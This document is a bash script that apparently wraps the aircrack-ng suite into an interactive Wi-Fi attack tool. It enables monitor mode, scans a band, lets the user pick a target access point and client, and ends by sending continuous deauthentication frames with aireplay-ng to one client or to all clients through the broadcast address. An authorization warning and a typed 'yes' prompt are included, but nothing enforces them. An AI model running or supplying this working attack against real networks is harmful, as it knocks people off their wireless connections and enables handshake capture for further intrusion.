#!/bin/bash
#
# doubletap.sh - Interactive aircrack-ng suite wrapper
# Automates: interface -> monitor mode -> band scan -> target select -> focused scan -> target select -> deauth
#
# Part of the AmpedGH wireless recon toolkit.
# Requires: aircrack-ng suite (airmon-ng, airodump-ng, aireplay-ng), root privileges
# Use only on networks you own or are explicitly authorized to test.
#

set -uo pipefail

SCAN_DIR="$(mktemp -d /tmp/doubletap.XXXXXX)"
IFACE=""
MONIFACE=""
CSV_PREFIX="$SCAN_DIR/scan"
FOCUS_PREFIX="$SCAN_DIR/focus"

cleanup() {
    echo
    echo "[*] Cleaning up..."
    if [[ -n "$MONIFACE" ]]; then
        airmon-ng stop "$MONIFACE" >/dev/null 2>&1
    fi
    rm -rf "$SCAN_DIR"
}
trap cleanup EXIT INT TERM

require_root() {
    if [[ $EUID -ne 0 ]]; then
        echo "[!] This script must be run as root (sudo)." >&2
        exit 1
    fi
}

check_deps() {
    for cmd in airmon-ng airodump-ng aireplay-ng; do
        if ! command -v "$cmd" >/dev/null 2>&1; then
            echo "[!] Missing dependency: $cmd. Install aircrack-ng suite." >&2
            exit 1
        fi
    done
}

select_interface() {
    echo "[*] Available wireless interfaces:"
    mapfile -t IFACES < <(iw dev 2>/dev/null | awk '$1=="Interface"{print $2}')
    if [[ ${#IFACES[@]} -eq 0 ]]; then
        echo "[!] No wireless interfaces found." >&2
        exit 1
    fi
    for i in "${!IFACES[@]}"; do
        printf "  [%d] %s\n" "$((i+1))" "${IFACES[$i]}"
    done
    read -rp "Select interface number: " sel
    if ! [[ "$sel" =~ ^[0-9]+$ ]] || (( sel < 1 || sel > ${#IFACES[@]} )); then
        echo "[!] Invalid selection." >&2
        exit 1
    fi
    IFACE="${IFACES[$((sel-1))]}"
    echo "[*] Selected interface: $IFACE"

    read -rp "Kill interfering processes (NetworkManager, wpa_supplicant, etc.)? [y/N]: " kill_choice
    if [[ "$kill_choice" =~ ^[Yy]$ ]]; then
        echo "[*] Killing interfering processes..."
        airmon-ng check kill >/dev/null 2>&1
    else
        echo "[*] Skipping process kill. Note: NetworkManager/wpa_supplicant may interfere with monitor mode or cause airodump to keep resetting the channel."
    fi

    echo "[*] Enabling monitor mode on $IFACE..."
    airmon-ng start "$IFACE" >/tmp/airmon_start.log 2>&1

    # Determine resulting monitor interface name (varies by driver: wlan0mon, wlan0, etc.)
    MONIFACE=$(iw dev 2>/dev/null | awk '$1=="Interface"{print $2}' | grep -E "mon$|^${IFACE}$" | head -n1)
    if [[ -z "$MONIFACE" ]]; then
        MONIFACE="${IFACE}mon"
    fi
    echo "[*] Monitor interface: $MONIFACE"
}

select_band() {
    echo
    echo "[*] Select band to scan:"
    echo "  [1] 2.4GHz"
    echo "  [2] 5GHz"
    read -rp "Choice: " band_choice
    case "$band_choice" in
        1) BAND_FLAG="--band a" ;;  # placeholder, corrected below
    esac
    if [[ "$band_choice" == "1" ]]; then
        BAND_FLAG="--channel 1,2,3,4,5,6,7,8,9,10,11"
        BAND_LABEL="2.4GHz"
    elif [[ "$band_choice" == "2" ]]; then
        BAND_FLAG="--band a"
        BAND_LABEL="5GHz"
    else
        echo "[!] Invalid choice." >&2
        exit 1
    fi
    echo "[*] Band selected: $BAND_LABEL"
}

# Runs airodump-ng in background, writes CSV, and waits for user to type '1' + Enter to stop
run_scan() {
    local prefix="$1"
    shift
    local extra_args=("$@")

    echo
    echo "[*] Starting airodump-ng scan — live view below."
    echo "[*] Type '1' and press Enter at any time to stop."
    rm -f "${prefix}"-*.csv 2>/dev/null

    # No output redirect here — airodump-ng writes its live table straight
    # to this terminal while running in the background.
    airodump-ng "${extra_args[@]}" -w "$prefix" --output-format csv "$MONIFACE" &
    local dump_pid=$!

    while true; do
        read -rp "> " stop_input
        if [[ "$stop_input" == "1" ]]; then
            kill "$dump_pid" >/dev/null 2>&1
            wait "$dump_pid" 2>/dev/null
            break
        fi
    done

    # Give airodump a moment to flush the CSV file
    sleep 1
}

# Parses the airodump CSV for APs and prints a numbered list; sets AP_BSSID / AP_CHANNEL / AP_ESSID
select_target_ap() {
    local prefix="$1"
    local csv_file
    csv_file=$(ls -t "${prefix}"-*.csv 2>/dev/null | head -n1)

    if [[ -z "$csv_file" || ! -f "$csv_file" ]]; then
        echo "[!] No scan results found." >&2
        exit 1
    fi

    # AP section of the CSV is between the header row and the blank line before "Station MAC"
    mapfile -t ap_lines < <(sed -n '/^BSSID/,/^$/p' "$csv_file" | sed '1d;$d' | sed '/^$/d')

    if [[ ${#ap_lines[@]} -eq 0 ]]; then
        echo "[!] No access points found in scan." >&2
        exit 1
    fi

    echo
    echo "[*] Discovered access points:"
    printf "  %-3s %-19s %-4s %-5s %s\n" "#" "BSSID" "CH" "PWR" "ESSID"

    declare -gA AP_MAP_BSSID
    declare -gA AP_MAP_CHANNEL
    declare -gA AP_MAP_ESSID

    local idx=1
    for line in "${ap_lines[@]}"; do
        local bssid channel power essid
        bssid=$(echo "$line" | awk -F', ' '{print $1}' | xargs)
        channel=$(echo "$line" | awk -F', ' '{print $4}' | xargs)
        power=$(echo "$line" | awk -F', ' '{print $9}' | xargs)
        essid=$(echo "$line" | awk -F', ' '{print $14}' | xargs)

        [[ -z "$bssid" ]] && continue

        printf "  %-3s %-19s %-4s %-5s %s\n" "$idx" "$bssid" "$channel" "$power" "$essid"
        AP_MAP_BSSID[$idx]="$bssid"
        AP_MAP_CHANNEL[$idx]="$channel"
        AP_MAP_ESSID[$idx]="$essid"
        ((idx++))
    done

    read -rp "Select target AP number: " ap_sel
    if [[ -z "${AP_MAP_BSSID[$ap_sel]:-}" ]]; then
        echo "[!] Invalid selection." >&2
        exit 1
    fi

    AP_BSSID="${AP_MAP_BSSID[$ap_sel]}"
    AP_CHANNEL="${AP_MAP_CHANNEL[$ap_sel]}"
    AP_ESSID="${AP_MAP_ESSID[$ap_sel]}"
    echo "[*] Target selected: $AP_ESSID ($AP_BSSID) on channel $AP_CHANNEL"
}

# Parses focused-scan CSV for stations connected to AP_BSSID; sets CLIENT_MAC
select_target_client() {
    local prefix="$1"
    local csv_file
    csv_file=$(ls -t "${prefix}"-*.csv 2>/dev/null | head -n1)

    if [[ -z "$csv_file" || ! -f "$csv_file" ]]; then
        echo "[!] No scan results found." >&2
        exit 1
    fi

    mapfile -t station_lines < <(sed -n '/^Station MAC/,$p' "$csv_file" | sed '1d' | sed '/^$/d')

    echo
    echo "[*] Connected clients (or choose 0 to target the broadcast address / all clients):"
    printf "  %-3s %-19s\n" "#" "Station MAC"
    printf "  %-3s %-19s\n" "0" "FF:FF:FF:FF:FF:FF (broadcast - all clients)"

    declare -gA CLIENT_MAP
    local idx=1
    for line in "${station_lines[@]}"; do
        local sta_mac assoc_bssid
        sta_mac=$(echo "$line" | awk -F', ' '{print $1}' | xargs)
        assoc_bssid=$(echo "$line" | awk -F', ' '{print $6}' | xargs)

        [[ -z "$sta_mac" ]] && continue
        [[ "$assoc_bssid" != "$AP_BSSID" ]] && continue

        printf "  %-3s %-19s\n" "$idx" "$sta_mac"
        CLIENT_MAP[$idx]="$sta_mac"
        ((idx++))
    done

    read -rp "Select client number (0 for broadcast): " cl_sel
    if [[ "$cl_sel" == "0" ]]; then
        CLIENT_MAC="FF:FF:FF:FF:FF:FF"
    elif [[ -n "${CLIENT_MAP[$cl_sel]:-}" ]]; then
        CLIENT_MAC="${CLIENT_MAP[$cl_sel]}"
    else
        echo "[!] Invalid selection." >&2
        exit 1
    fi
    echo "[*] Client selected: $CLIENT_MAC"
}

do_deauth() {
    echo
    echo "[*] Preparing deauth: AP=$AP_BSSID CH=$AP_CHANNEL Client=$CLIENT_MAC"
    read -rp "Confirm you are authorized to test this network. Type 'yes' to proceed: " confirm
    if [[ "$confirm" != "yes" ]]; then
        echo "[*] Aborted."
        return
    fi

    iw dev "$MONIFACE" set channel "$AP_CHANNEL" >/dev/null 2>&1

    if [[ "$CLIENT_MAC" == "FF:FF:FF:FF:FF:FF" ]]; then
        aireplay-ng -0 0 -a "$AP_BSSID" "$MONIFACE"
    else
        aireplay-ng -0 0 -a "$AP_BSSID" -c "$CLIENT_MAC" "$MONIFACE"
    fi
}

main() {
    require_root
    check_deps
    select_interface
    select_band

    # Phase 1: broad band scan
    run_scan "$CSV_PREFIX" $BAND_FLAG
    select_target_ap "$CSV_PREFIX"

    # Phase 2: focused scan on target channel
    echo
    echo "[*] Locking to channel $AP_CHANNEL for focused scan on $AP_ESSID..."
    run_scan "$FOCUS_PREFIX" --bssid "$AP_BSSID" --channel "$AP_CHANNEL"
    select_target_client "$FOCUS_PREFIX"

    # Phase 3: deauth
    do_deauth
}

main
